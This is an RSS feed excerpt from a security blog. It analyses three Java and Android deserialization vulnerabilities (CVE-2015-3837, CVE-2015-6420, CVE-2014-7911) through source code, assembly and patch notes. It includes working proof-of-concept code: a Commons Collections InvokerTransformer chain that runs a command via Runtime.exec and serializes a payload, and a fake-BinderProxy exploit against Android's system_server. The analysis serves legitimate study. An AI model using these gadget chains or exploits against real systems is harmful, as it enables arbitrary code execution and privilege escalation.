      <pubDate>Mon, 07 Mar 2016 20:45:41 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/07/analysis-of-cve-2015-3837/</guid>
      <description>

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;

&lt;p&gt;CVE-2015-3837 is another java deserialzation vulnerability in android. &lt;a href=&#34;http://drops.wooyun.org/papers/10235&#34;&gt;Wooyun&lt;/a&gt; had analyzed it.&lt;/p&gt;

&lt;h2 id=&#34;description-on-cve&#34;&gt;Description on CVE&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;The OpenSSLX509Certificate class in org/conscrypt/OpenSSLX509Certificate.java in Android before 5.1.1 LMY48I improperly includes certain context data during serialization and deserialization, which allows attackers to execute arbitrary code via an application that sends a crafted Intent, aka internal bug 21437603.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;We know that Google had patched the bug disclosed in CVE-2014-7911, in which &lt;code&gt;ObjectInputStream&lt;/code&gt; didn&amp;rsquo;t validate an object can be serialzed or not. The bug can be used to create arbitrary object by deserialization, even the object is not a serializable object, such as &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. After being patched, an object will be checked whether it is serializable before deserialization. But if there is an serializable class which overrides &lt;code&gt;finalize()&lt;/code&gt; method like BinderProxy, the attacker can still leverage it to execute arbitrary code.&lt;/p&gt;

&lt;h2 id=&#34;finalize-of-opensslx509certificate&#34;&gt;finalize() of OpenSSLX509Certificate&lt;/h2&gt;

&lt;p&gt;The location of OpenSSLX509Certificate.java is &lt;code&gt;/external/conscrypt/src/main/java/org/conscrypt/OpenSSLX509Certificate.java&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@Override
protected void finalize() throws Throwable {
    try {
        if (mContext != 0) {
            NativeCrypto.X509_free(mContext);
        }
    } finally {
        super.finalize();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In NativeCrypto.java&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static native void X509_free(long x509ctx);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In org_conscrypt_NativeCrypto.cpp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;static void NativeCrypto_X509_free(JNIEnv* env, jclass, jlong x509Ref) {

    // cast the mContext to a pointer of X509 struct
    X509* x509 = reinterpret_cast&amp;lt;X509*&amp;gt;(static_cast&amp;lt;uintptr_t&amp;gt;(x509Ref));
    JNI_TRACE(&amp;quot;X509_free(%p)&amp;quot;, x509);

    if (x509 == NULL) {
        jniThrowNullPointerException(env, &amp;quot;x509 == null&amp;quot;);
        JNI_TRACE(&amp;quot;X509_free(%p) =&amp;gt; x509 == null&amp;quot;, x509);
            return;
    }
    X509_free(x509);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here, I encountered some difficulties finding the definition of &lt;code&gt;X509_free&lt;/code&gt;, so I have to look &lt;a href=&#34;http://drops.wooyun.org/papers/10235&#34;&gt;Wooyun&lt;/a&gt; for help. It said that X509_free is defined by nested macros which starts at &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)&lt;/code&gt; in &lt;code&gt;crypto/asn1/x_x509.c&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I downloaded openssl source code from &lt;a href=&#34;https://github.com/openssl/openssl&#34;&gt;GitHub&lt;/a&gt; and found it in &lt;code&gt;crypto/x509/X_x509.c&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In &lt;code&gt;include/openssl/Asn1t.h&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;# define IMPLEMENT_ASN1_FUNCTIONS(stname) IMPLEMENT_ASN1_FUNCTIONS_fname(stname, stname, stname)

# define IMPLEMENT_ASN1_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(stname, itname, fname) \
        IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname)

# define IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(stname, itname, fname) \
        stname *fname##_new(void) \
        { \
                return (stname *)ASN1_item_new(ASN1_ITEM_rptr(itname)); \
        } \
        void fname##_free(stname *a) \
        { \
                ASN1_item_free((ASN1_VALUE *)a, ASN1_ITEM_rptr(itname)); \
        }

# define IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(stname, itname, fname) \
        stname *d2i_##fname(stname **a, const unsigned char **in, long len) \
        { \
                return (stname *)ASN1_item_d2i((ASN1_VALUE **)a, in, len, ASN1_ITEM_rptr(itname));\
        } \
        int i2d_##fname(stname *a, unsigned char **out) \
        { \
                return ASN1_item_i2d((ASN1_VALUE *)a, out, ASN1_ITEM_rptr(itname));\
        }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS(X509)&lt;/code&gt; equals &lt;code&gt;IMPLEMENT_ASN1_FUNCTIONS_fname(X509, X509, X509)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which equals &lt;code&gt;IMPLEMENT_ASN1_ENCODE_FUNCTIONS_fname(X509, X509, X509);IMPLEMENT_ASN1_ALLOC_FUNCTIONS_fname(X509, X509, X509)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Which equals&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;/* encode functions omitted */

X509 *X509_new(void)
{
        return (stname *)ASN1_item_new(ASN1_ITEM_rptr(X509));
}
void X509_free(X509 *a)
{
        ASN1_item_free((ASN1_VALUE *)a, ASN1_ITEM_rptr(X509));
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So this is how &lt;code&gt;X509_free()&lt;/code&gt; is defined by macros.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void ASN1_item_free(ASN1_VALUE *val, const ASN1_ITEM *it)
{
    asn1_item_embed_free(&amp;amp;val, it, 0);
}

static void asn1_item_embed_free(ASN1_VALUE **pval, const ASN1_ITEM *it, int embed)
{
    const ASN1_TEMPLATE *tt = NULL, *seqtt;
    const ASN1_EXTERN_FUNCS *ef;
    const ASN1_AUX *aux = it-&amp;gt;funcs;
    ASN1_aux_cb *asn1_cb;
    int i;

    if (!pval)
        return;
    if ((it-&amp;gt;itype != ASN1_ITYPE_PRIMITIVE) &amp;amp;&amp;amp; !*pval)
        return;
    if (aux &amp;amp;&amp;amp; aux-&amp;gt;asn1_cb)
        asn1_cb = aux-&amp;gt;asn1_cb;
    else
        asn1_cb = 0;

    switch (it-&amp;gt;itype) {

    case ASN1_ITYPE_PRIMITIVE:
        if (it-&amp;gt;templates)
            asn1_template_free(pval, it-&amp;gt;templates);
        else
            asn1_primitive_free(pval, it);
        break;

    case ASN1_ITYPE_MSTRING:
        asn1_primitive_free(pval, it);
        break;

    case ASN1_ITYPE_CHOICE:
        if (asn1_cb) {
            i = asn1_cb(ASN1_OP_FREE_PRE, pval, it, NULL);
            if (i == 2)
                return;
        }
        i = asn1_get_choice_selector(pval, it);
        if ((i &amp;gt;= 0) &amp;amp;&amp;amp; (i &amp;lt; it-&amp;gt;tcount)) {
            ASN1_VALUE **pchval;

            tt = it-&amp;gt;templates + i;
            pchval = asn1_get_field_ptr(pval, tt);
            asn1_template_free(pchval, tt);
        }
        if (asn1_cb)
            asn1_cb(ASN1_OP_FREE_POST, pval, it, NULL);
        if (embed == 0) {
            OPENSSL_free(*pval);
            *pval = NULL;
        }
        break;

    case ASN1_ITYPE_EXTERN:
        ef = it-&amp;gt;funcs;
        if (ef &amp;amp;&amp;amp; ef-&amp;gt;asn1_ex_free)
            ef-&amp;gt;asn1_ex_free(pval, it);
        break;

    case ASN1_ITYPE_NDEF_SEQUENCE:
    case ASN1_ITYPE_SEQUENCE:
        if (asn1_do_lock(pval, -1, it) &amp;gt; 0)
            return;
        if (asn1_cb) {
            i = asn1_cb(ASN1_OP_FREE_PRE, pval, it, NULL);
            if (i == 2)
                return;
        }
        asn1_enc_free(pval, it);
        /*
         * If we free up as normal we will invalidate any ANY DEFINED BY
         * field and we wont be able to determine the type of the field it
         * defines. So free up in reverse order.
         */
        tt = it-&amp;gt;templates + it-&amp;gt;tcount - 1;
        for (i = 0; i &amp;lt; it-&amp;gt;tcount; tt--, i++) {
            ASN1_VALUE **pseqval;
            seqtt = asn1_do_adb(pval, tt, 0);
            if (!seqtt)
                continue;
            pseqval = asn1_get_field_ptr(pval, seqtt);
            asn1_template_free(pseqval, seqtt);
        }
        if (asn1_cb)
            asn1_cb(ASN1_OP_FREE_POST, pval, it, NULL);
        if (embed == 0) {
            OPENSSL_free(*pval);
            *pval = NULL;
        }
        break;
    }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;I write the POC by modifying cve-2014-7911&amp;rsquo;s POC, but it didn&amp;rsquo;t work. I&amp;rsquo;ll continue working on it.&lt;/p&gt;

&lt;h2 id=&#34;google-s-patch&#34;&gt;Google&amp;rsquo;s Patch&lt;/h2&gt;

&lt;p&gt;To patch this vulnerability, Google just adds &amp;laquo;transient&amp;raquo; before the definition of the field &lt;code&gt;OpenSSLX509Certificate.mContext&lt;/code&gt;, in order to disable it to be serialized.&lt;/p&gt;

&lt;h2 id=&#34;related-papers&#34;&gt;Related Papers&lt;/h2&gt;

&lt;p&gt;I&amp;rsquo;ve read the paper &lt;a href=&#34;https://www.usenix.org/conference/woot15/workshop-program/presentation/peles&#34;&gt;One Class to Rule Them All&lt;/a&gt;, where this vulnerability disclosure to public. In this paper, a method is raised to find the vulnerable classes automatically, by defining some criterias and implementing a JDI to check on them. For how to debugging Java programs using Java code, read &lt;a href=&#34;https://zeqiii.github.io/2016/03/10/methods-of-debugging-java-programs/&#34;&gt;Methods of Debugging Java Programs&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2015-6420</title>
      <link>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</link>
      <pubDate>Sat, 05 Mar 2016 19:41:52 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/03/05/analysis-of-cve-2015-6420/</guid>
      <description>

&lt;h2 id=&#34;apache-commons-collections:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;Apache Commons Collections&lt;/h2&gt;

&lt;p&gt;Apache Commons Collections implements &lt;code&gt;TransformedMap&lt;/code&gt; whose &lt;code&gt;decorate()&lt;/code&gt; method can perform some operations on a &lt;code&gt;Map&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Transformer&lt;/code&gt; is an implementation to transform an object.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public interface Transformer {
    public Object transform(Object input);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;Map&lt;/code&gt; has key and value. Parameters of &lt;code&gt;decorate()&lt;/code&gt;, keyTransformer is responsible for the transformation of the keys of a &lt;code&gt;Map&lt;/code&gt;, valueTransformer is responsible for values of a &lt;code&gt;Map&lt;/code&gt;. When a &lt;code&gt;TransformMap&lt;/code&gt; is modified, the method &lt;code&gt;transform()&lt;/code&gt; of keyTransformer or valueTransformer will be invoked.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2015-6420/transform.png&#34; alt=&#34;TransformMap&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;invokertransformer:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;InvokerTransformer&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;InvokerTransformer&lt;/code&gt; is one of the implementation of &lt;code&gt;Transformer&lt;/code&gt;, which can call any method through reflection.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class InvokerTransformer implements Transformer, Serializable {
...
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        super();
        iMethodName = methodName;
        iParamTypes = paramTypes;
        iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        }
        try {
            Class cls = input.getClass();
            Method method = cls.getMethod(iMethodName, iParamTypes);
            return method.invoke(input, iArgs);
        } catch (NoSuchMethodException ex) {
            ...
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Given a method name, parameter types and values, &lt;code&gt;InvokerTransformer&lt;/code&gt; uses reflection in its &lt;code&gt;transform()&lt;/code&gt; method to invoke the corresponding method. So attacker can craft a &lt;code&gt;ChainedTransformer&lt;/code&gt; with several &lt;code&gt;InvokerTransformer&lt;/code&gt; in order to execute a series of commands.&lt;/p&gt;

&lt;p&gt;For example&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map innerMap = new hashMap();
    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();
    // trigger the invocation of transform()
    onlyElement.setValue(&amp;quot;foobar&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When &lt;code&gt;setValue()&lt;/code&gt; is executed, it triggers the callback to invoke &lt;code&gt;transform()&lt;/code&gt;. For &lt;code&gt;ChainedTransformer&lt;/code&gt;, it triggers a series of &lt;code&gt;transform()&lt;/code&gt; to be executed. In the example above, it is equivalent to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;((Runtime)Runtime.class.getMethod(&amp;quot;getRuntime&amp;quot;,null).invoke(null,new Object[0])).exec(&amp;quot;calc.exe&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;annotationinvocationhandler:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;AnnotationInvocationHandler&lt;/h2&gt;

&lt;p&gt;To now, we have known that we can craft a &lt;code&gt;TransformedMap&lt;/code&gt; to execute arbitrary code. To archieve our goal, we must find some way to modify the element of  &lt;code&gt;TransformedMap&lt;/code&gt; so that &lt;code&gt;transform()&lt;/code&gt; can be invoked.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;AnnotationInvocationHandler&lt;/code&gt; has a field whose type is &lt;code&gt;Map&lt;/code&gt;. Also, it implements &lt;code&gt;Serializable&lt;/code&gt; and override &lt;code&gt;readObject()&lt;/code&gt;, in which every element of &lt;code&gt;memberValues&lt;/code&gt; invokes &lt;code&gt;setValue()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class&amp;lt;? extends Annotation&amp;gt; type;
    private final Map&amp;lt;String, Object&amp;gt; memberValues;

    AnnotationInvocationHandler(Class&amp;lt;? extends Annotation&amp;gt; type, Map&amp;lt;String, Object&amp;gt; memberValues) {
        this.type = type;
        this.memberValues = memberValues;
    }
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, we can initialize an &lt;code&gt;AnnotationInvocationHandler&lt;/code&gt;, set its &lt;code&gt;memberValues&lt;/code&gt; to  our crafted &lt;code&gt;TransformedMap&lt;/code&gt;, then serialize it to get a payload. If the target receives the payload and deserializes it, our code could be executed.&lt;/p&gt;

&lt;h2 id=&#34;poc:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;POC&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public static void main(String[] args) throws Exception {
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&amp;quot;getMethod&amp;quot;, new Class[] {
            String.class, Class[].class }, new Object[] {
            &amp;quot;getRuntime&amp;quot;, new Class[0] }),
        new InvokerTransformer(&amp;quot;invoke&amp;quot;, new Class[] {
            Object.class, Object[].class }, new Object[] {
            null, new Object[0] }),
        new InvokerTransformer(&amp;quot;exec&amp;quot;, new Class[] {
            String.class }, new Object[] {&amp;quot;calc.exe&amp;quot;})};

    Transformer transformedChain = new ChainedTransformer(transformers);

    Map innerMap = new hashMap();
    innerMap.put(&amp;quot;value&amp;quot;, &amp;quot;value&amp;quot;);
    map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);

    Class cl = Class.forName(&amp;quot;sun.reflect.annotation.AnnotationInvocationHandler&amp;quot;);
    Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);
    ctor.setAccessible(true);
    Object instance = ctor.newInstance(Target.class, outerMap);

    File f = new File(&amp;quot;payload.bin&amp;quot;);
    ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
    out.writeObject(instance);
    out.flush();
    out.close();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;references:ef74d8aa59408b4c04e16ce890e41e31&#34;&gt;References&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&#34;&gt;http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Analysis of cve-2014-7911</title>
      <link>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</link>
      <pubDate>Mon, 29 Feb 2016 16:34:11 +0800</pubDate>
      <author>zeqiii@163.com (zeqi)</author>
      <guid>https://zeqiii.github.io/2016/02/29/analysis-of-cve-2014-7911/</guid>
      <description>

&lt;h2 id=&#34;a-brief-look&#34;&gt;A brief look&lt;/h2&gt;

&lt;p&gt;System_server is a process has &lt;strong&gt;system&lt;/strong&gt; permission, to which one can send any serializable data. Although system_server won&amp;rsquo;t invoke any functions of the received objected, but &lt;code&gt;finalize&lt;/code&gt; will be called when &lt;strong&gt;GC&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Function &lt;code&gt;finalize&lt;/code&gt; in &lt;code&gt;android.os.BinderProxy&lt;/code&gt; calls a native function which has pointers, the pointers may be controlled by attackers. So &lt;strong&gt;GC&lt;/strong&gt; may result in arbitrary code execution. &lt;code&gt;android.os.BinderProxy&lt;/code&gt; isn&amp;rsquo;t serializable, however, java.io.ObjectInputStream doesn&amp;rsquo;t check whether an object really is serializable, attackers can craft a fake BinderProxy to acheive the goals.
As other one&amp;rsquo;s blog says:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ObjectInputStream doesn&amp;rsquo;t validate that the serialized object&amp;rsquo;s class type, as described in the serialized object, is actually serializable. It creates an instance of the wanted class anyway with the deserialized values of the object. Therefore, one can create object of any class, and control its private variables, by serializing objects from another class, that would be deserialized as data members of the wanted class.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;poc&#34;&gt;POC&lt;/h2&gt;

&lt;p&gt;Let&amp;rsquo;s just see the POC written by &lt;strong&gt;Jann Horn&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AAdroid.os.BinderProxy.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;public class BinderProxy implements Serializable {
   private static final long serialVersionUID = 0;
   //public long mObject = 0x1337beef;
   //public long mOrgue = 0x1337beef;
   private int mObject = 0x1337beef;
   private int mOrgue = 0x1337beef;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Partial code of MainActivity.java&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// Put the fake BinderProxy object into a Bundle
Bundle b = new Bundle();
AAdroid.os.BinderProxy evilProxy = new AAdroid.os.BinderProxy();
b.putSerializable(&amp;quot;eatthis&amp;quot;, evilProxy);

// Get IUserManager using reflection
Class clIUserManager = Class.forName(&amp;quot;android.os.IUserManager&amp;quot;);
// Get inner class Stub from IUserManager
Class[] umSubclasses = clIUserManager.getDeclaredClasses();
Class clStub = null;
for (Class c: umSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub&amp;quot;)) {
        clStub = c;
    }
}
// Get the field &amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;
Field fTRANSACTION_setApplicationRestrictions = clStub.getDeclaredField(&amp;quot;TRANSACTION_setApplicationRestrictions&amp;quot;);
fTRANSACTION_setApplicationRestrictions.setAccessible(true);
TRANSACTION_setApplicationRestrictions = fTRANSACTION_setApplicationRestrictions.getInt(null);

// Get UserManager
UserManager um = (UserManager) ctx.getSystemService(Context.USER_SERVICE);
// mService is a field of UserManager, its type is IUserManager
Field fService = UserManager.class.getDeclaredField(&amp;quot;mService&amp;quot;);
fService.setAccessible(true);
// Get mService from UserManager
Object proxy = fService.get(um);

// Get Stub.Proxy from clStub
Class[] stSubclasses = clStub.getDeclaredClasses();
clProxy = null;
for (Class c: stSubclasses) {
    if (c.getCanonicalName().equals(&amp;quot;android.os.IUserManager.Stub.Proxy&amp;quot;)) {
        clProxy = c;
    }
}
// Get field mRemote from Proxy
Field fRemote = clProxy.getDeclaredField(&amp;quot;mRemote&amp;quot;);
fRemote.setAccessible(true);
mRemote = (IBinder) fRemote.get(proxy);
UserHandle me = android.os.Process.myUserHandle();

// Triggr it!
setApplicationRestrictions(ctx.getPackageName(), b, me.hashCode());
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
&lt;li&gt;Implementation of setApplicationRestrictions&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;// This function modifies the Bundle, marshalling it, find &amp;quot;AAdr&amp;quot; and changing it to &amp;quot;andr&amp;quot;, so the class description becomes &amp;quot;android.os.BinderProxy&amp;quot;
public void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int userHandle) throws android.os.RemoteException 
{ 
    android.os.Parcel _data = android.os.Parcel.obtain(); 
    android.os.Parcel _reply = android.os.Parcel.obtain(); 
    try { 
        _data.writeInterfaceToken(DESCRIPTOR); 
        _data.writeString(packageName); 
        _data.writeInt(1); 
        restrictions.writeToParcel(_data, 0); 
        _data.writeInt(userHandle); 
        byte[] data = _data.marshall(); 
        for (int i=0; true; i++) { 
            if (data[i] == &#39;A&#39; &amp;amp;&amp;amp; data[i+1] == &#39;A&#39; &amp;amp;&amp;amp; data[i+2] == &#39;d&#39; &amp;amp;&amp;amp; data[i+3] == &#39;r&#39;) { 
                data[i] = &#39;a&#39;; 
                data[i+1] = &#39;n&#39;; 
                break; 
            } 
        } 
        _data.recycle(); 
        _data = Parcel.obtain(); 
        _data.unmarshall(data, 0, data.length); 
        mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0); 
        _reply.readException(); 
    } 
    finally { 
        _reply.recycle(); 
        _data.recycle(); 
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From the POC we know that a fake object is created and put into a bundle. It&amp;rsquo;s &lt;code&gt;mObject&lt;/code&gt; and &lt;code&gt;mOrgue&lt;/code&gt; is under attacker&amp;rsquo;s controll and can be set to any values. In function &lt;code&gt;setApplicationRestrictions()&lt;/code&gt;, the bundle object is written to a parcel using &lt;code&gt;restrictions.writeToParcel()&lt;/code&gt;. After the parcel marshalled to a byte array, a loop appears to find string &lt;code&gt;AAdr&lt;/code&gt;, and change &lt;code&gt;AA&lt;/code&gt; to &lt;code&gt;an&lt;/code&gt;. Thus, &lt;code&gt;AAdroid.os.BinderProxy&lt;/code&gt; finally becomes &lt;code&gt;android.os.BinderProxy&lt;/code&gt;. When &lt;code&gt;java.io.ObjectInputStream&lt;/code&gt; deserializes this object, a &lt;code&gt;android.os.BinderProxy&lt;/code&gt; object will be created. In this way, attackers can create any object and set the field value as they want.&lt;/p&gt;

&lt;h2 id=&#34;why-binderproxy&#34;&gt;Why BinderProxy?&lt;/h2&gt;

&lt;p&gt;So why attackers choose &lt;code&gt;android.os.BinderProxy&lt;/code&gt;? Here is the source code of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;protected void finalize() throws Throwable {
	destroy();
	super.finalize();
	return;
	Exception exception;
	exception;
	super.finalize();
	throw exception;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;finalize()&lt;/code&gt; method will call a native method &lt;code&gt;distroy()&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;static void android_os_BinderProxy_destroy(JNIEnv* env, jobject obj) {
    IBinder* b = (IBinder*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mObject);
    DeathRecipientList* drl = (DeathRecipientList*)
            env-&amp;gt;GetIntField(obj, gBinderProxyOffsets.mOrgue);
    LOGDEATH(&amp;quot;Destroying BinderProxy %p: binder=%p drl=%p\n&amp;quot;, obj, b, drl);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mObject, 0);
    env-&amp;gt;SetIntField(obj, gBinderProxyOffsets.mOrgue, 0);
    drl-&amp;gt;decStrong((void*)javaObjectForIBinder);
    b-&amp;gt;decStrong((void*)javaObjectForIBinder);
    IPCThreadState::self()-&amp;gt;flushCommands();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In the above method, &lt;code&gt;mOrgue&lt;/code&gt; is regarded as a pointer of &lt;code&gt;DeathRecipientList&lt;/code&gt;, assigned to &lt;code&gt;drl&lt;/code&gt;. Then &lt;code&gt;drl-&amp;gt;decStrong()&lt;/code&gt; is invoked.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;void RefBase::decStrong(const void* id) const {
    weakref_impl* const refs = mRefs;
    refs-&amp;gt;removeStrongRef(id);
    const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
#if PRINT_REFS
    ALOGD(&amp;quot;decStrong of %p from %p: cnt=%d\n&amp;quot;, this, id, c);
#endif
    ALOG_ASSERT(c &amp;gt;= 1, &amp;quot;decStrong() called on %p too many times&amp;quot;, refs);
    if (c == 1) {
        refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
        if ((refs-&amp;gt;mFlags&amp;amp;OBJECT_LIFETIME_MASK) == OBJECT_LIFETIME_STRONG) {
            delete this;
        }
    }
    refs-&amp;gt;decWeak(id);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;According to other&amp;rsquo;s blog, &lt;code&gt;refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);&lt;/code&gt; will eventually causes arbitrary code execution. Below is the assembly code sceenshot from &lt;a href=&#34;http://wooyun.org/&#34;&gt;wooyun.org&lt;/a&gt;, attacker controlls r0 (&lt;code&gt;this&lt;/code&gt; pointer).&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zeqiii.github.io/img/cve-2014-7911/assembly.png&#34; alt=&#34;Image of assembly&#34; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;weakref_impl* const refs = mRefs;
refs-&amp;gt;removeStrongRef(id);
const int32_t c = android_atomic_dec(&amp;amp;refs-&amp;gt;mStrong);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;ldr     r4, [r0, #4]   ; attacker controls r0 also r4
mov     r6, r1
mov     r0, r4
blx     &amp;lt;android_atomic_dec ()&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Then&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;if (c == 1) {
	refs-&amp;gt;mBase-&amp;gt;onLastStrongRef(id);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Transferred to assembly is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-assembly&#34;&gt;cmp     r0, #1
bne.n   d1ea
ldr     r0, [r4, #8]  ; attacker controls r4 also r0
mov     r1, r6
ldr     r3, [r0, #0]  ; attacker controls r0 also r3
ldr     r2, [r3, #12] ; attacker controls r3 also r2
blx     r2            ; execute code pointed by r2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;If everything goes smoothly, the code pointed by r2 will be executed.&lt;/p&gt;

